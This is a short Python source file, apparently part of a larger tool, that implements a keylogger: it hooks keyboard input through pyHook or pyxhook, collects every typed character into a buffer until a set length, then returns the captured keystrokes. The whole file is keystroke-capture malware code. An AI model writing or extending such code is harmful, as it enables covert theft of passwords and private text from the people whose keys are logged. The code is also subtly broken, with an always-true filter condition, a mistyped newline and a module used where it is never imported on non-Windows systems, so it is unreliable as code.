import sys
import pyHook
import os

keysPressed = ">"


def onkeyboardevent(event):
    global keysPressed
    if event.Ascii != 0 or 8:
        keysPressed += chr(event.Ascii)
    if event.Ascii == 13:
        keysPressed += "/n"
    return True


def keylogger(size):
    if os.name == "nt":
        import win32api
        import pythoncom
        from pyHook import HookManager
    else:
        from pyxhook import HookManager
    global keysPressed
    hm = HookManager()
    hm.KeyDown = onkeyboardevent
    hm.HookKeyboard()
    while len(keysPressed) < int(size):
        pythoncom.PumpWaitingMessages()
    else:
        keys = keysPressed
        keysPressed = ">"
        hm.UnhookKeyboard()
        return keys
